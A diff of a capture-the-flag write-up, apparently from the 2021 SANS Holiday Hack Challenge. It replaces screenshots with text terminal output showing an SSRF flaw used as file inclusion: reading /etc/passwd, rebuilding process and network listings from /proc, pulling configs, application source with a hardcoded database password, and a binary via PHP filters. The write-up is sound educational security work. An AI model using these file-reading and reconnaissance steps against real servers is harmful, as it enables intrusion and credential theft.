@@ -5,18 +5,49 @@ to see how much information about the underlying system the web application was
 running on. The answer is, quite a lot, enough to reverse engineer the system to
 duplicate it on my local machine.
 
-## SSRF is (in this app) also LFI
+## SSRF is (in This App) Also LFI
 
 After trying some different payloads from
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), I 
 attempted a payload containing a `file://` resource to attempt to read a file
 from the filesystem. To my surprise, it worked:
 
-![Reading /etc/passwd via file://](img/hhc-2021-09.png)
+``` shell-session
+$ python apply-ssrf.py
+ssrf> file:///etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+...
+```
 
 Trying without the `file://` also worked:
 
-![LFI vulnerability](img/hhc-2021-10.png)
+``` shell-session
+ssrf> /etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+...
+```
 
 In this application, the SSRF vulnerability also allows
 an attacker to read local files, known as a [Local File
@@ -36,7 +67,7 @@ vulnerability. With some knowledge of how the Linux `/proc` filesystem is laid o
 some simple Python scripting, we can produce a process list and open network connections
 without access to commands such as `ps` and `netstat`.
 
-## Fetching a process listing
+## Fetching a Process Listing
 
 The Linux `/proc` virtual filesystem provides an interface into data structures
 in the Linux kernel. Each process in the system is represented by a directory
@@ -106,7 +137,28 @@ defined:
 
 Running this against the website returns a picture of the system environment:
 
-![process listing for apply.jackfrosttower.com](img/hhc-2021-11.png)
+``` shell-session
+ssrf> ps
+UID       PID PPID CMD
+root        1    0 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
+root        8    1 /bin/sh /opt/gonginx.sh
+root        9    1 php-fpm: master process (/etc/php7/php-fpm.conf)
+root       14    1 /bin/sh /opt/imds/imds.sh
+root       22    8 nginx: master process nginx -g daemon off;
+root       24   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+nginx      25   22 nginx: worker process
+root       26   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+root       27   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+root       28   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+root       29   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+root       32   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+root       36   14 /opt/imds/ec2-metadata -c /opt/imds/config.json
+nobody    118    9 php-fpm: pool www
+nobody    119    9 php-fpm: pool www
+nobody    120    9 php-fpm: pool www
+
+ssrf>
+```
 
 From this list, we know a number of things:
 
@@ -180,9 +232,28 @@ on port `80`, something is listening on port `9000` (most likely PHP-FPM), and
 a final process is listening on the AWS metadata IP address `169.254.169.254`, 
 undoubtedly the `ec2-metadata` process.
 
-![LISTENing and open TCP connections](img/hhc-2021-12.png)
+``` shell-session
+ssrf> netstat
+Local Address           Remote Address          State
+127.0.0.1:9000          0.0.0.0:0               TCP_LISTEN
+169.254.169.254:80      0.0.0.0:0               TCP_LISTEN
+172.17.0.2:80           0.0.0.0:0               TCP_LISTEN
+172.17.0.2:80           130.211.0.94:62065      TCP_TIME_WAIT
+172.17.0.2:80           130.211.1.78:55574      TCP_TIME_WAIT
+172.17.0.2:80           35.191.15.167:64577     TCP_TIME_WAIT
+172.17.0.2:80           35.191.8.30:59921       TCP_TIME_WAIT
+127.0.0.1:9000          127.0.0.1:46666         TCP_TIME_WAIT
+172.17.0.2:80           130.211.1.86:61100      TCP_TIME_WAIT
+172.17.0.2:80           35.191.12.197:59722     TCP_TIME_WAIT
+172.17.0.2:80           35.191.19.122:50468     TCP_TIME_WAIT
+172.17.0.2:80           35.191.15.218:59766     TCP_TIME_WAIT
+172.17.0.2:80           35.191.3.69:53260       TCP_TIME_WAIT
+172.17.0.2:80           35.191.9.214:50848      TCP_TIME_WAIT
+172.17.0.2:80           130.211.1.89:57593      TCP_TIME_WAIT
+...
+```
 
-## Identifying the container distribution
+## Identifying the Container Distribution
 
 The next piece of the puzzle we need to decipher is what Linux distribution
 is the container built on. Identifying this is critical to re-creating the environment
@@ -195,24 +266,49 @@ can determine the distribtion version used:
 - `/etc/alpine-release`: used on Alpine Linux, a lightweight Linux distribution
 designed for low overhead environments such as containers
 
-(Other distributions such as Arch or Gentoo will have files used that can
-be used to identify them, discovering those is an exercise for the reader)
+Other distributions such as Arch or Gentoo will have files used that can
+be used to identify them, discovering those is an exercise for the reader
 
 Fetching `/etc/issue` shows that the container is running [Alpine Linux](https://www.alpinelinux.org/), and `/etc/alpine-release` shows it's specific version is `3.10.9`.
 
-![Identifying Alpine Linux version](img/hhc-2021-13.png)
+``` shell-session
+ssrf> /etc/issue
+Welcome to Alpine Linux 3.10
+Kernel \r on an \m (\l)
+
+
+ssrf> /etc/alpine-release
+3.10.9
+
+ssrf>
+```
 
 We now have enough information to create a version of the environment.
 
-## Enumerating Alpine packages
+## Enumerating Alpine Packages
 
 Apline uses the `apk` command for managing packages installed in the OS. While we can't
 run commands on the container to determine what packages are installed, `apk` does
 keep track of explicitly installed packages in the file `/etc/apk/world`:
 
-![/etc/apk/world](img/hhc-2021-14.png)
+``` shell-session
+ssrf> /etc/apk/world
+alpine-baselayout
+alpine-keys
+apk-tools
+busybox
+curl
+libc-utils
+nginx
+php7
+php7-fpm
+php7-openssl
+supervisor
 
-The package list tracks with the information we determined from the process
+ssrf>
+```
+
+The package list matches what we determined from the process
 list: `supervisor`, `nginx`, `php7` and `php7-fpm` are installed in the
 container, along with supporting packages such as `busybox` and `curl`. There
 doesn't appear to be any kind of remote access service such as `ssh` or `ftp` 
@@ -220,14 +316,18 @@ available, which also confirms the information from the listening TCP sockets.
 Finally, the `ec2-metadata` binary isn't listed in the list of installed
 packages, indicating it may be installed separately as part of the container build.
 
-## Service configuration files
+## Service Configuration Files
 
-### supervisord.conf and startup scripts
+### supervisord.conf and Startup Scripts
 
 The first configuration file we'll need to pull is for `supervisord`, from 
 `/etc/supervisor/conf.d/supervisord.conf`:
 
-![Fetching supervisord.conf](img/hhc-2021-15.png)
+``` shell-session
+$ python3 apply-ssrf.py --file /etc/supervisor/conf.d/supervisord.conf > supervisord.conf
+
+$ cat supervisord.conf
+```
 
 ``` ini
 [supervisord]
@@ -267,9 +367,12 @@ startretries=0
 are stored in the directory `/wwwlog`. Pulling those logs might give us additional
 information about how the server is configured.
 
-`gonginx.sh`, as expected, starts `nginx`. One interesting thing is the script
+The `gonginx.sh` script first determines the IP address assigned to the `eth0`
+interface. It then
 modifies `/etc/nginx/nginx.conf` in place, replacing the string `##ETH0IP##` with
-the IP address of the `eth0` interface.
+the IP address. If we want to use this script unchanged, we'll
+need to modify `nginx.conf` to have this configuration before we build the container.
+It finally starts the `nginx` service in the foreground.
 
 ``` sh
 #!/bin/sh
@@ -327,7 +430,7 @@ server {
     }
 ```
 
-### PHP configuration
+### PHP Configuration
 
 To configure PHP to match the actual container, we need to transfer some
 additional files:
@@ -352,7 +455,7 @@ security.limit_extensions = .php .html
 This changes what file extensions are allowed to execute PHP code, adding `.html` 
 as a valid PHP file.
 
-### EC2 metadata service configuration
+### EC2 Metadata Service Configuration
 
 The final configuration file we need to fetch configures the `ec2-metadata` 
 program. It's a JSON file located at `/opt/imds/config.json` and contains the 
@@ -371,22 +474,44 @@ zone, which presumably stands for the `North Pole (North) 1a`.
 "placement-region": "np-north-1",
 ```
 
-## Application files
+## Application Files
 
 The last pieces needed to complete the application is the `ec2-metadata` executable
 and the web application file(s). 
 
-### Web application file(s)
+### Web Application File(s)
 
 With no way to list files, we have to guess at the file or files needed to run the
 actual application. From the `nginx.conf` file, an educated guess is the main page
 of the application is either `index.php` or `index.html`. Attempting to fetch
 `index.html` succeeds in retrieving the application source:
 
-![Fetching index.html](img/hhc-2021-16.png)
+``` shell-session
+$ python3 apply-ssrf.py --file index.html > index.html
+
+$ cat index.html
+<?php
+define('DB_NAME', 'intern');
+define('DB_USER', 'intern');
+define('DB_PASSWORD', 'polarwinds');
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Frost Tower</title>
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+...
+```
 
 We'll dig deeper into how the application works later, once we have a version of
-it running locally. We do need some additional files to complete the 
+it running locally. We do need some additional files from the original
 application. They're not absolutely necessary to test the code, but they make
 the application look like the one hosted on `apply.jackfrosttower.com`:
 
@@ -396,12 +521,22 @@ the application look like the one hosted on `apply.jackfrosttower.com`:
 - `https://apply.jackfrosttower.com/images/server.png`
 - `https://apply.jackfrosttower.com/images/zoomed2.png`
 
-### ec2-metadata binary
+### `ec2-metadata` Binary
 
 If we try and fetch the `/opt/imds/ec2-metadata` binary directly, the file returned
 generates errors when run:
 
-![exec format error](img/hhc-2021-17.png)
+``` shell-session
+$ python3 apply-ssrf.py --file /opt/imds/ec2-metadata > ec2-metadata
+
+$ file ec2-metadata
+ec2-metadata: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), no program header, missing section headers at 125467397854331328
+
+$ chmod 755 ec2-metadata
+
+$ ./ec2-metadata
+bash: ./ec2-metadata: cannot execute binary file: Exec format error
+```
 
 However, we can utilize [PHP
 filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
@@ -444,9 +579,24 @@ specifying a negative windows size to the `decompress()` function causes the
 library to not look for the header and footer. Using this `largefile` function,
 we can successfully fetch the `ec2-metadata` binary:
 
-![Successful transfer of ec2-metadata](img/hhc-2021-18.png)
+``` shell-session
+$ python3 apply-ssrf.py
+ssrf> largefile /opt/imds/ec2-metadata
+Wrote 12275029 bytes to ec2-metadata
 
-## Building the container
+ssrf>
+
+$ file ec2-metadata
+ec2-metadata: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=RgLJMo3PW55KpjxPNtR7/_3DcfCs7l1TpUSsi38cV/5P4Qwf-UXWsvAff99Cdp/zEip8jJiM6yQwB1h8mG5, not stripped
+
+$ chmod 755 ec2-metadata
+
+$ ./ec2-metadata
+2022/01/07 15:21:05 Warning:  Config File "aemm-config" Not Found in "[/home/jra]"
+2022/01/07 15:21:05 Initiating ec2-metadata-mock for all mocks on port 1338
+```
+
+## Building the Container
 
 We now have all the pieces we need to build the container and run the application
 on our own infrastructure. We set up the `html/` and `opt/` directories with
@@ -538,7 +688,7 @@ And, we can verify the application's SSRF/LFI vulnerability still works in our
 local version:
 
 ``` shell-session
-$ python apply-ssrf.py --url=http://10.114.180.112:8888/
+$ python3 apply-ssrf.py --url http://10.114.180.112:8888/
 ssrf> ps
 UID       PID PPID CMD
 root        1    0 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
